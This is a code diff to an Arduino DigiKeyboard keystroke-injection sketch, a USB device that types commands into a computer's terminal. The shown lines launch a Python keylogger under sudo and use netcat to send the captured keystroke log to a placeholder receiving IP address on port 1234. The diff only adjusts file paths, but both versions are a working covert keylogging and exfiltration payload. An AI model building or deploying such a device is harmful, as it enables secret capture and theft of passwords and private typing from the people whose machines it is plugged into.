@@ -53,7 +53,7 @@ void loop() {
     DigiKeyboard.print("do");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     // ** replace the IP address below with your computer's IP address **
-    DigiKeyboard.print("  nc [receiving computer's IP address] 1234 < ~/Documents/testing_log/logged_text.txt");
+    DigiKeyboard.print("  nc [receiving computer's IP address] 1234 < ~/Documents/logged_text.txt");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.print("done");
     DigiKeyboard.sendKeyStroke(52, MOD_SHIFT_LEFT);
@@ -84,11 +84,11 @@ void loop() {
 
     // open a new terminal window and run the keylogger
     DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
-    DigiKeyboard.print("cd Documents/testing_log");
+    DigiKeyboard.print("cd Documents");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     
     // unfortunately, we need to use sudo, so we need the password
-    DigiKeyboard.print("sudo python3 ~/Documents/testing_log/logger.py");
+    DigiKeyboard.print("sudo python3 ~/Documents/logger.py");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     
     finished = true;
